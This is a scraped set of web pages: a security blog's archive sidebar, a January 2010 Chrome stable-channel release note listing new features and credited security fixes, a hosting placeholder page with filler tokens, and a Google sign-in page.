    [November](https://scarybeastsecurity.blogspot.com/2009/11/)
    (2)
  + ►
    [October](https://scarybeastsecurity.blogspot.com/2009/10/)
    (3)
  + ►
    [September](https://scarybeastsecurity.blogspot.com/2009/09/)
    (1)
  + ►
    [August](https://scarybeastsecurity.blogspot.com/2009/08/)
    (2)
  + ►
    [July](https://scarybeastsecurity.blogspot.com/2009/07/)
    (3)
  + ►
    [June](https://scarybeastsecurity.blogspot.com/2009/06/)
    (4)
  + ►
    [May](https://scarybeastsecurity.blogspot.com/2009/05/)
    (3)
  + ►
    [March](https://scarybeastsecurity.blogspot.com/2009/03/)
    (3)
  + ►
    [February](https://scarybeastsecurity.blogspot.com/2009/02/)
    (4)
  + ►
    [January](https://scarybeastsecurity.blogspot.com/2009/01/)
    (1)

* ►
  [2008](https://scarybeastsecurity.blogspot.com/2008/)
  (20)
  + ►
    [December](https://scarybeastsecurity.blogspot.com/2008/12/)
    (2)
  + ►
    [November](https://scarybeastsecurity.blogspot.com/2008/11/)
    (5)
  + ►
    [October](https://scarybeastsecurity.blogspot.com/2008/10/)
    (1)
  + ►
    [August](https://scarybeastsecurity.blogspot.com/2008/08/)
    (3)
  + ►
    [July](https://scarybeastsecurity.blogspot.com/2008/07/)
    (5)
  + ►
    [March](https://scarybeastsecurity.blogspot.com/2008/03/)
    (1)
  + ►
    [February](https://scarybeastsecurity.blogspot.com/2008/02/)
    (3)

## My other stuff

* [My security advisories](http://scary.beasts.org/)
* [vsftpd home page](http://vsftpd.beasts.org/)
* [Tavis' security advisories](http://taviso.decsystem.org/research.html)

|  |  |
| --- | --- |

Simple theme. Theme images by [gaffera](https://www.istockphoto.com/googleimages.php?id=4072573&platform=blogger&langregion=en). Powered by [Blogger](https://www.blogger.com).



=== Content from googlechromereleases.blogspot.com_7273abcf_20250125_142540.html ===


![](https://ad.doubleclick.net/ddm/activity/src=2542116;type=gblog;cat=googl0;ord=1?)

[![](https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_284x96dp.png)](https://chromereleases.googleblog.com/)
[## Chrome Releases](/.)

Release updates from the Chrome team

## [Stable Channel Update](https://chromereleases.googleblog.com/2010/01/stable-channel-update_25.html "Stable Channel Update")

Monday, January 25, 2010

The stable channel has been updated to 4.0.249.78 for Windows, and includes the following features and security fixes (since 3.0):

* Extensions
* Bookmark sync
* Enhanced developer tools
* HTML5: Notifications, Web Database, Local Storage, WebSockets, Ruby support
* v8 performance improvements
* Skia performance improvements
* Full ACID3 pass, due to re-enabled remote font support (with added defense against bugs in operating system font libraries)
* HTTP byte range support
* New security feature: "Strict Transport Security" support
* Experimental new anti-reflected-XSS feature called "XSS Auditor"

**Security Fixes:**

Please see the [Chromium security page](http://sites.google.com/a/chromium.org/dev/Home/chromium-security) for more detail. Note that the referenced bugs may be kept private until a majority of our users are up to date with the fix.

* [[3275](http://code.google.com/p/chromium/issues/detail?id=3275)] **Low** Pop-up blocker bypass. *Credit to Google Chrome Security Team (SkyLined).*
* [[9877](http://code.google.com/p/chromium/issues/detail?id=9877)] **Medium** Cross-domain theft due to CSS design error. *Credit to Chris Evans of the Google Security Team.*
* [[12523](http://code.google.com/p/chromium/issues/detail?id=12523)] **Medium** Browser memory error with stale pop-up block menu. *Credit to Jacob Balle and Carsten Eiram, Secunia Research.*
* [[20450](http://code.google.com/p/chromium/issues/detail?id=23693)] **Low** Prevent XHR to directories. *Credit to the Chromium development community.*
* [[23693](http://code.google.com/p/chromium/issues/detail?id=23693)] **Low** Escape more characters in shortcuts. *Credit to Michal Zalewski of the Google Security Team and, independently, Inferno of SecureThoughts.com.*
* [[8864](http://code.google.com/p/chromium/issues/detail?id=8864)] [[24701](http://code.google.com/p/chromium/issues/detail?id=24701)] [[24646](http://code.google.com/p/chromium/issues/detail?id=24646)] **High** Renderer memory errors drawing on canvases. *Credit to Michal Zalewski of the Google Security Team and Google Chrome Security Team (SkyLined).*
* [[28566](http://code.google.com/p/chromium/issues/detail?id=28566)] **High** Image decoding memory error. *Credit to Robert Swiecki of the Google Security Team.*
* [[29920](http://code.google.com/p/chromium/issues/detail?id=29920)] **Low** Corner case failure to strip Referer. *Credit to the Chromium development community.*
* [[30660](http://code.google.com/p/chromium/issues/detail?id=30660)] **High** Cross-domain access error. *Credit to Tokuji Akamine, Senior Consultant at Symantec Consulting Services.*
* [[31307](http://code.google.com/p/chromium/issues/detail?id=31307)] **High** Bitmap deserialization error. *Credit to Mark Dowd, under contract to Google Chrome Security Team.*
* [[31517](http://code.google.com/p/chromium/issues/detail?id=31517)] **Low** Browser crash with nested URL.

Anthony Laforge
Google Chrome Program Manager

![Share on Twitter](https://www.gstatic.com/images/icons/material/system/2x/post_twitter_black_24dp.png)

![Share on Facebook](https://www.gstatic.com/images/icons/material/system/2x/post_facebook_black_24dp.png)

[Google](https://plus.google.com/112374322230920073195)
Labels:

[Stable updates](https://chromereleases.googleblog.com/search/label/Stable%20updates)

[**](https://chromereleases.googleblog.com/)
[**](https://chromereleases.googleblog.com/2010/01/dev-channel-update_29.html "Newer Post")

[**](https://chromereleases.googleblog.com/2010/01/dev-channel-update_22.html "Older Post")

![](data:image/png;base64...)
## Labels

**

* [Admin Console](https://chromereleases.googleblog.com/search/label/Admin%20Console)
  43
* [Android WebView](https://chromereleases.googleblog.com/search/label/Android%20WebView)
  19
* [Beta](https://chromereleases.googleblog.com/search/label/Beta)
  21
* [Beta update](https://chromereleases.googleblog.com/search/label/Beta%20update)
  4
* [Beta updates](https://chromereleases.googleblog.com/search/label/Beta%20updates)
  2037
* [chrome](https://chromereleases.googleblog.com/search/label/chrome)
  15
* [Chrome Dev for Android](https://chromereleases.googleblog.com/search/label/Chrome%20Dev%20for%20Android)
  135
* [Chrome for Android](https://chromereleases.googleblog.com/search/label/Chrome%20for%20Android)
  964
* [Chrome for iOS](https://chromereleases.googleblog.com/search/label/Chrome%20for%20iOS)
  388
* [Chrome for Meetings](https://chromereleases.googleblog.com/search/label/Chrome%20for%20Meetings)
  5
* [Chrome OS](https://chromereleases.googleblog.com/search/label/Chrome%20OS)
  1150
* [Chrome OS Flex](https://chromereleases.googleblog.com/search/label/Chrome%20OS%20Flex)
  24
* [Chrome OS Management](https://chromereleases.googleblog.com/search/label/Chrome%20OS%20Management)
  12
* [Chromecast Update](https://chromereleases.googleblog.com/search/label/Chromecast%20Update)
  6
* [ChromeOS](https://chromereleases.googleblog.com/search/label/ChromeOS)
  217
* [ChromeOS Flex](https://chromereleases.googleblog.com/search/label/ChromeOS%20Flex)
  213
* [Desktop Update](https://chromereleases.googleblog.com/search/label/Desktop%20Update)
  1133
* [dev update](https://chromereleases.googleblog.com/search/label/dev%20update)
  266
* [Dev updates](https://chromereleases.googleblog.com/search/label/Dev%20updates)
  1518
* [Early Stable Updates](https://chromereleases.googleblog.com/search/label/Early%20Stable%20Updates)
  50
* [Extended Stable updates](https://chromereleases.googleblog.com/search/label/Extended%20Stable%20updates)
  134
* [Flash Player update](https://chromereleases.googleblog.com/search/label/Flash%20Player%20update)
  5
* [Flex](https://chromereleases.googleblog.com/search/label/Flex)
  1
* [Hangouts Meet hardware](https://chromereleases.googleblog.com/search/label/Hangouts%20Meet%20hardware)
  5
* [LTS](https://chromereleases.googleblog.com/search/label/LTS)
  91
* [stable](https://chromereleases.googleblog.com/search/label/stable)
  11
* [Stable updates](https://chromereleases.googleblog.com/search/label/Stable%20updates)
  1260

**
## Archive

**

* **

  **
  [2025](https://chromereleases.googleblog.com/2025/)

  + [Jan](https://chromereleases.googleblog.com/2025/01/)

* **

  **
  [2024](https://chromereleases.googleblog.com/2024/)

  + [Dec](https://chromereleases.googleblog.com/2024/12/)
  + [Nov](https://chromereleases.googleblog.com/2024/11/)
  + [Oct](https://chromereleases.googleblog.com/2024/10/)
  + [Sep](https://chromereleases.googleblog.com/2024/09/)
  + [Aug](https://chromereleases.googleblog.com/2024/08/)
  + [Jul](https://chromereleases.googleblog.com/2024/07/)
  + [Jun](https://chromereleases.googleblog.com/2024/06/)
  + [May](https://chromereleases.googleblog.com/2024/05/)
  + [Apr](https://chromereleases.googleblog.com/2024/04/)
  + [Mar](https://chromereleases.googleblog.com/2024/03/)
  + [Feb](https://chromereleases.googleblog.com/2024/02/)
  + [Jan](https://chromereleases.googleblog.com/2024/01/)

* **

  **
  [2023](https://chromereleases.googleblog.com/2023/)

  + [Dec](https://chromereleases.googleblog.com/2023/12/)
  + [Nov](https://chromereleases.googleblog.com/2023/11/)
  + [Oct](https://chromereleases.googleblog.com/2023/10/)
  + [Sep](https://chromereleases.googleblog.com/2023/09/)
  + [Aug](https://chromereleases.googleblog.com/2023/08/)
  + [Jul](https://chromereleases.googleblog.com/2023/07/)
  + [Jun](https://chromereleases.googleblog.com/2023/06/)
  + [May](https://chromereleases.googleblog.com/2023/05/)
  + [Apr](https://chromereleases.googleblog.com/2023/04/)
  + [Mar](https://chromereleases.googleblog.com/2023/03/)
  + [Feb](https://chromereleases.googleblog.com/2023/02/)
  + [Jan](https://chromereleases.googleblog.com/2023/01/)

* **

  **
  [2022](https://chromereleases.googleblog.com/2022/)

  + [Dec](https://chromereleases.googleblog.com/2022/12/)
  + [Nov](https://chromereleases.googleblog.com/2022/11/)
  + [Oct](https://chromereleases.googleblog.com/2022/10/)
  + [Sep](https://chromereleases.googleblog.com/2022/09/)
  + [Aug](https://chromereleases.googleblog.com/2022/08/)
  + [Jul](https://chromereleases.googleblog.com/2022/07/)
  + [Jun](https://chromereleases.googleblog.com/2022/06/)
  + [May](https://chromereleases.googleblog.com/2022/05/)
  + [Apr](https://chromereleases.googleblog.com/2022/04/)
  + [Mar](https://chromereleases.googleblog.com/2022/03/)
  + [Feb](https://chromereleases.googleblog.com/2022/02/)
  + [Jan](https://chromereleases.googleblog.com/2022/01/)

* **

  **
  [2021](https://chromereleases.googleblog.com/2021/)

  + [Dec](https://chromereleases.googleblog.com/2021/12/)
  + [Nov](https://chromereleases.googleblog.com/2021/11/)
  + [Oct](https://chromereleases.googleblog.com/2021/10/)
  + [Sep](https://chromereleases.googleblog.com/2021/09/)
  + [Aug](https://chromereleases.googleblog.com/2021/08/)
  + [Jul](https://chromereleases.googleblog.com/2021/07/)
  + [Jun](https://chromereleases.googleblog.com/2021/06/)
  + [May](https://chromereleases.googleblog.com/2021/05/)
  + [Apr](https://chromereleases.googleblog.com/2021/04/)
  + [Mar](https://chromereleases.googleblog.com/2021/03/)
  + [Feb](https://chromereleases.googleblog.com/2021/02/)
  + [Jan](https://chromereleases.googleblog.com/2021/01/)

* **

  **
  [2020](https://chromereleases.googleblog.com/2020/)

  + [Dec](https://chromereleases.googleblog.com/2020/12/)
  + [Nov](https://chromereleases.googleblog.com/2020/11/)
  + [Oct](https://chromereleases.googleblog.com/2020/10/)
  + [Sep](https://chromereleases.googleblog.com/2020/09/)
  + [Aug](https://chromereleases.googleblog.com/2020/08/)
  + [Jul](https://chromereleases.googleblog.com/2020/07/)
  + [Jun](https://chromereleases.googleblog.com/2020/06/)
  + [May](https://chromereleases.googleblog.com/2020/05/)
  + [Apr](https://chromereleases.googleblog.com/2020/04/)
  + [Mar](https://chromereleases.googleblog.com/2020/03/)
  + [Feb](https://chromereleases.googleblog.com/2020/02/)
  + [Jan](https://chromereleases.googleblog.com/2020/01/)

* **

  **
  [2019](https://chromereleases.googleblog.com/2019/)

  + [Dec](https://chromereleases.googleblog.com/2019/12/)
  + [Nov](https://chromereleases.googleblog.com/2019/11/)
  + [Oct](https://chromereleases.googleblog.com/2019/10/)
  + [Sep](https://chromereleases.googleblog.com/2019/09/)
  + [Aug](https://chromereleases.googleblog.com/2019/08/)
  + [Jul](https://chromereleases.googleblog.com/2019/07/)
  + [Jun](https://chromereleases.googleblog.com/2019/06/)
  + [May](https://chromereleases.googleblog.com/2019/05/)
  + [Apr](https://chromereleases.googleblog.com/2019/04/)
  + [Mar](https://chromereleases.googleblog.com/2019/03/)
  + [Feb](https://chromereleases.googleblog.com/2019/02/)
  + [Jan](https://chromereleases.googleblog.com/2019/01/)

* **

  **
  [2018](https://chromereleases.googleblog.com/2018/)

  + [Dec](https://chromereleases.googleblog.com/2018/12/)
  + [Nov](https://chromereleases.googleblog.com/2018/11/)
  + [Oct](https://chromereleases.googleblog.com/2018/10/)
  + [Sep](https://chromereleases.googleblog.com/2018/09/)
  + [Aug](https://chromereleases.googleblog.com/2018/08/)
  + [Jul](https://chromereleases.googleblog.com/2018/07/)
  + [Jun](https://chromereleases.googleblog.com/2018/06/)
  + [May](https://chromereleases.googleblog.com/2018/05/)
  + [Apr](https://chromereleases.googleblog.com/2018/04/)
  + [Mar](https://chromereleases.googleblog.com/2018/03/)
  + [Feb](https://chromereleases.googleblog.com/2018/02/)
  + [Jan](https://chromereleases.googleblog.com/2018/01/)

* **

  **
  [2017](https://chromereleases.googleblog.com/2017/)

  + [Dec](https://chromereleases.googleblog.com/2017/12/)
  + [Nov](https://chromereleases.googleblog.com/2017/11/)
  + [Oct](https://chromereleases.googleblog.com/2017/10/)
  + [Sep](https://chromereleases.googleblog.com/2017/09/)
  + [Aug](https://chromereleases.googleblog.com/2017/08/)
  + [Jul](https://chromereleases.googleblog.com/2017/07/)
  + [Jun](https://chromereleases.googleblog.com/2017/06/)
  + [May](https://chromereleases.googleblog.com/2017/05/)
  + [Apr](https://chromereleases.googleblog.com/2017/04/)
  + [Mar](https://chromereleases.googleblog.com/2017/03/)
  + [Feb](https://chromereleases.googleblog.com/2017/02/)
  + [Jan](https://chromereleases.googleblog.com/2017/01/)

* **

  **
  [2016](https://chromereleases.googleblog.com/2016/)

  + [Dec](https://chromereleases.googleblog.com/2016/12/)
  + [Nov](https://chromereleases.googleblog.com/2016/11/)
  + [Oct](https://chromereleases.googleblog.com/2016/10/)
  + [Sep](https://chromereleases.googleblog.com/2016/09/)
  + [Aug](https://chromereleases.googleblog.com/2016/08/)
  + [Jul](https://chromereleases.googleblog.com/2016/07/)
  + [Jun](https://chromereleases.googleblog.com/2016/06/)
  + [May](https://chromereleases.googleblog.com/2016/05/)
  + [Apr](https://chromereleases.googleblog.com/2016/04/)
  + [Mar](https://chromereleases.googleblog.com/2016/03/)
  + [Feb](https://chromereleases.googleblog.com/2016/02/)
  + [Jan](https://chromereleases.googleblog.com/2016/01/)

* **

  **
  [2015](https://chromereleases.googleblog.com/2015/)

  + [Dec](https://chromereleases.googleblog.com/2015/12/)
  + [Nov](https://chromereleases.googleblog.com/2015/11/)
  + [Oct](https://chromereleases.googleblog.com/2015/10/)
  + [Sep](https://chromereleases.googleblog.com/2015/09/)
  + [Aug](https://chromereleases.googleblog.com/2015/08/)
  + [Jul](https://chromereleases.googleblog.com/2015/07/)
  + [Jun](https://chromereleases.googleblog.com/2015/06/)
  + [May](https://chromereleases.googleblog.com/2015/05/)
  + [Apr](https://chromereleases.googleblog.com/2015/04/)
  + [Mar](https://chromereleases.googleblog.com/2015/03/)
  + [Feb](https://chromereleases.googleblog.com/2015/02/)
  + [Jan](https://chromereleases.googleblog.com/2015/01/)

* **

  **
  [2014](https://chromereleases.googleblog.com/2014/)

  + [Dec](https://chromereleases.googleblog.com/2014/12/)
  + [Nov](https://chromereleases.googleblog.com/2014/11/)
  + [Oct](https://chromereleases.googleblog.com/2014/10/)
  + [Sep](https://chromereleases.googleblog.com/2014/09/)
  + [Aug](https://chromereleases.googleblog.com/2014/08/)
  + [Jul](https://chromereleases.googleblog.com/2014/07/)
  + [Jun](https://chromereleases.googleblog.com/2014/06/)
  + [May](https://chromereleases.googleblog.com/2014/05/)
  + [Apr](https://chromereleases.googleblog.com/2014/04/)
  + [Mar](https://chromereleases.googleblog.com/2014/03/)
  + [Feb](https://chromereleases.googleblog.com/2014/02/)
  + [Jan](https://chromereleases.googleblog.com/2014/01/)

* **

  **
  [2013](https://chromereleases.googleblog.com/2013/)

  + [Dec](https://chromereleases.googleblog.com/2013/12/)
  + [Nov](https://chromereleases.googleblog.com/2013/11/)
  + [Oct](https://chromereleases.googleblog.com/2013/10/)
  + [Sep](https://chromereleases.googleblog.com/2013/09/)
  + [Aug](https://chromereleases.googleblog.com/2013/08/)
  + [Jul](https://chromereleases.googleblog.com/2013/07/)
  + [Jun](https://chromereleases.googleblog.com/2013/06/)
  + [May](https://chromereleases.googleblog.com/2013/05/)
  + [Apr](https://chromereleases.googleblog.com/2013/04/)
  + [Mar](https://chromereleases.googleblog.com/2013/03/)
  + [Feb](https://chromereleases.googleblog.com/2013/02/)
  + [Jan](https://chromereleases.googleblog.com/2013/01/)

* **

  **
  [2012](https://chromereleases.googleblog.com/2012/)

  + [Dec](https://chromereleases.googleblog.com/2012/12/)
  + [Nov](https://chromereleases.googleblog.com/2012/11/)
  + [Oct](https://chromereleases.googleblog.com/2012/10/)
  + [Sep](https://chromereleases.googleblog.com/2012/09/)
  + [Aug](https://chromereleases.googleblog.com/2012/08/)
  + [Jul](https://chromereleases.googleblog.com/2012/07/)
  + [Jun](https://chromereleases.googleblog.com/2012/06/)
  + [May](https://chromereleases.googleblog.com/2012/05/)
  + [Apr](https://chromereleases.googleblog.com/2012/04/)
  + [Mar](https://chromereleases.googleblog.com/2012/03/)
  + [Feb](https://chromereleases.googleblog.com/2012/02/)
  + [Jan](https://chromereleases.googleblog.com/2012/01/)

* **

  **
  [2011](https://chromereleases.googleblog.com/2011/)

  + [Dec](https://chromereleases.googleblog.com/2011/12/)
  + [Nov](https://chromereleases.googleblog.com/2011/11/)
  + [Oct](https://chromereleases.googleblog.com/2011/10/)
  + [Sep](https://chromereleases.googleblog.com/2011/09/)
  + [Aug](https://chromereleases.googleblog.com/2011/08/)
  + [Jul](https://chromereleases.googleblog.com/2011/07/)
  + [Jun](https://chromereleases.googleblog.com/2011/06/)
  + [May](https://chromereleases.googleblog.com/2011/05/)
  + [Apr](https://chromereleases.googleblog.com/2011/04/)
  + [Mar](https://chromereleases.googleblog.com/2011/03/)
  + [Feb](https://chromereleases.googleblog.com/2011/02/)
  + [Jan](https://chromereleases.googleblog.com/2011/01/)

* **

  **
  [2010](https://chromereleases.googleblog.com/2010/)

  + [Dec](https://chromereleases.googleblog.com/2010/12/)
  + [Nov](https://chromereleases.googleblog.com/2010/11/)
  + [Oct](https://chromereleases.googleblog.com/2010/10/)
  + [Sep](https://chromereleases.googleblog.com/2010/09/)
  + [Aug](https://chromereleases.googleblog.com/2010/08/)
  + [Jul](https://chromereleases.googleblog.com/2010/07/)
  + [Jun](https://chromereleases.googleblog.com/2010/06/)
  + [May](https://chromereleases.googleblog.com/2010/05/)
  + [Apr](https://chromereleases.googleblog.com/2010/04/)
  + [Mar](https://chromereleases.googleblog.com/2010/03/)
  + [Feb](https://chromereleases.googleblog.com/2010/02/)
  + [Jan](https://chromereleases.googleblog.com/2010/01/)

* **

  **
  [2009](https://chromereleases.googleblog.com/2009/)

  + [Dec](https://chromereleases.googleblog.com/2009/12/)
  + [Nov](https://chromereleases.googleblog.com/2009/11/)
  + [Oct](https://chromereleases.googleblog.com/2009/10/)
  + [Sep](https://chromereleases.googleblog.com/2009/09/)
  + [Aug](https://chromereleases.googleblog.com/2009/08/)
  + [Jul](https://chromereleases.googleblog.com/2009/07/)
  + [Jun](https://chromereleases.googleblog.com/2009/06/)
  + [May](https://chromereleases.googleblog.com/2009/05/)
  + [Apr](https://chromereleases.googleblog.com/2009/04/)
  + [Mar](https://chromereleases.googleblog.com/2009/03/)
  + [Feb](https://chromereleases.googleblog.com/2009/02/)
  + [Jan](https://chromereleases.googleblog.com/2009/01/)

* **

  **
  [2008](https://chromereleases.googleblog.com/2008/)

  + [Dec](https://chromereleases.googleblog.com/2008/12/)
  + [Nov](https://chromereleases.googleblog.com/2008/11/)
  + [Oct](https://chromereleases.googleblog.com/2008/10/)
  + [Sep](https://chromereleases.googleblog.com/2008/09/)

Give us feedback in our
 [Product Forums](http://support.google.com/bin/static.py?hl=en&page=portal_groups.cs).

[![](data:image/png;base64...)](//www.google.com/)

* [Google](//www.google.com/)
* [Privacy](//www.google.com/policies/privacy/)
* [Terms](//www.google.com/policies/terms/)



=== Content from www.vupen.com_c10c05ed_20250125_142605.html ===

[![](/__ovh/common/img/logo-white.png)](https://www.ovhcloud.com/)

![](/__ovh/common/img/icon-traffic-cone.png)

# Site en construction

![](/__ovh/common/img/shadow.png)

Besoin d'assistance ou d'informations ?

[![](/__ovh/common/img/icon-book.png)
Guides](https://docs.ovh.com/fr/hosting/ "Guides")
[![](/__ovh/common/img/icon-speech-bubble.png)
Forum](https://community.ovh.com/ "Forum")
[![](/__ovh/common/img/icon-user-support.png)
Contact](https://help.ovhcloud.com/fr/ "Contact")
[![](/__ovh/common/img/icon-app-gear.png)
Espace Client](https://www.ovh.com/manager/ "Espace Client")

© Copyright 1999 [OVHcloud](https://www.ovhcloud.com/)

v1v2v3v4v5v6v7v8v9v10v11v12v13v14v15v16v17v18v19v20v21v22v23v24v25v26v27v28v29v30v31v32v33v34v35v36v37v38v39v40v41v42v43v44v45v46v47v48v49v50v51v52v53v54v55v56v57v58v59v60v61v62v63v64v65v66v67v68v69v70

u1u2u3u4u5u6u7u8u9u10u11u12u13u14u15u16u17u18u19u20u21u22u23u24u25u26u27u28u29u30u31u32u33u34u35u36u37u38u39u40u41u42u43u44u45u46u47u48u49u50u51u52u53u54u55u56u57u58u59u60u61u62u63u64u65u66u67u68u69

p1p2p3p4p5p6p7p8p9p10p11p12p13p14p15p16p17p18p19p20p21p22p23p24p25p26p27p28p29p30p31p32p33p34p35p36p37p38p39p40p41p42p43p44p45p46p47p48p49p50p51p52p53p54p55p56p57p58p59p60p61p62p63p64

e1e2e3e4e5e6e7e8e9e10e11e12e13e14e15e16e17e18e19e20e21e22e23e24e25e26e27e28e29e30e31e32e33e34e35e36e37e38e39e40e41e42e43e44e45e46e47e48e49e50e51e52e53

n1n2n3n4n5n6n7n8n9n10n11n12n13n14n15n16n17n18n19n20n21n22n23n24n25n26n27n28n29n30n31n32n33n34n35n36n37n38n39n40n41n42n43n44n45n46n47n48n49n50n51n52n53n54n55n56n57n58n59n60n61n62

---

c1c2c3c4c5c6c7c8c9c10c11c12c13c14c15c16c17c18c19c20c21c22c23c24c25c26c27c28c29c30c31c32c33c34c35c36c37c38c39c40c41c42c43c44c45c46c47c48c49c50c51

o1o2o3o4o5o6o7o8o9o10o11o12o13o14o15o16o17o18o19o20o21o22o23o24o25o26o27o28o29o30o31o32o33o34o35o36o37o38o39o40o41o42o43o44o45o46o47o48o49o50o51o52o53o54o55o56o57o58o59o60o61o62o63

m1m2m3m4m5m6m7m8m9m10m11m12m13m14m15m16m17m18m19m20m21m22m23m24m25m26m27m28m29m30m31m32m33m34m35m36m37m38m39m40m41m42m43m44m45m46m47m48m49m50m51m52m53m54m55m56m57m58m59m60m61



=== Content from sites.google.com_06230d1a_20250125_142550.html ===

# Sign in

Use your Google AccountEmail or phoneForgot email?![CAPTCHA image of text used to distinguish humans from robots]()Type the text you hear or seeNot your computer? Use Guest mode to sign in privately. [Learn more about using Guest mode](https://support.google.com/chrome/answer/6130773?hl=en-US)NextCreate account
